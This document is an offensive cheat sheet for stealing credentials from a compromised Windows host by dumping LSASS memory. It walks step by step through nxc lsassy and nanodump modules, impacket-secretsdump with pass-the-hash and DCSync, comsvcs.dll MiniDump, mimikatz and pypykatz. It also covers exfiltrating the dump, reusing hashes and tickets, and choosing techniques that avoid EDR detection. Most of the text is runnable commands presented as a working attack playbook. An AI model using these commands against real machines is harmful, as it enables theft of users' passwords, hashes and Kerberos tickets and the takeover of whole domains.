LSASS Dumping - Cheat Sheet

Dump the LSASS process memory (or local credential stores) on a compromised
Windows host to recover plaintext passwords, NT hashes, and Kerberos tickets
of users logged on to that machine. Requires local admin / SYSTEM.
Replace the placeholders (<...>) with your own values.


Step 1 - Confirm you have local admin / SYSTEM

LSASS lives in protected memory. You need high integrity to read it:

    nxc smb <target-ip> -u <user> -p <password>

Look for "(Pwn3d!)" - that means the account is local admin on the target.


Step 2 - Remote dump with nxc (easiest)

nxc can dump LSASS remotely and parse it for you (lsassy module):

    nxc smb <target-ip> -u <user> -p <password> --lsa
    nxc smb <target-ip> -u <user> -p <password> -M lsassy
    nxc smb <target-ip> -u <user> -p <password> -M nanodump

--lsa pulls SAM/LSA secrets and cached creds. The lsassy/nanodump modules
dump live LSASS memory and parse credentials over the wire (no file left on disk).


Step 3 - secretsdump (remote, no LSASS needed)

Pulls SAM, LSA secrets, cached domain creds, and (with DA) the full NTDS:

    impacket-secretsdump <domain>/<user>:<password>@<target-ip>

    # Pass-the-hash instead of password:
    impacket-secretsdump <domain>/<user>@<target-ip> -hashes :<nt-hash>

    # Full domain dump via DCSync (needs DCSync rights / Domain Admin):
    impacket-secretsdump <domain>/<user>:<password>@<dc-ip>

Output gives uid:rid:lm:nt::: lines - feed the NT hashes straight into PtH.


Step 4 - Manual dump on the host (if you have a shell)

Option A - comsvcs.dll (lives on every Windows box, no upload needed):

    # Find the LSASS PID:
    tasklist /fi "imagename eq lsass.exe"

    rundll32.exe C:\Windows\System32\comsvcs.dll, MiniDump <lsass-pid> C:\Windows\Temp\lsass.dmp full

Option B - Task Manager: right-click lsass.exe > Create dump file.

Option C - mimikatz (live):

    privilege::debug
    sekurlsa::logonpasswords
    sekurlsa::ekeys          # Kerberos encryption keys
    lsadump::sam             # local SAM hashes

Then exfil the .dmp and parse it offline (see Step 5).


Step 5 - Parse the dump offline on Kali

    pypykatz lsa minidump lsass.dmp

pypykatz extracts plaintext passwords, NT hashes, and Kerberos tickets from
the dump - all offline, nothing touches the target.


Step 6 - Use what you recovered

  - NT hash      -> Pass-the-Hash (see pass-the-hash cheatsheet)
  - Plaintext pw -> spray / evil-winrm / nxc
  - TGT/ekeys    -> Pass-the-Ticket
  - Hunt for Domain Admin or service-account creds among the logged-on users


Key idea: LSASS caches the credentials of everyone logged on to a machine -
plaintext, NT hashes, and Kerberos tickets. One local-admin foothold can hand
you a more privileged user's creds if they ever logged on there. Modern EDR
heavily watches LSASS access, so prefer techniques that avoid touching it
directly (secretsdump, --lsa, cached secrets) when stealth matters.
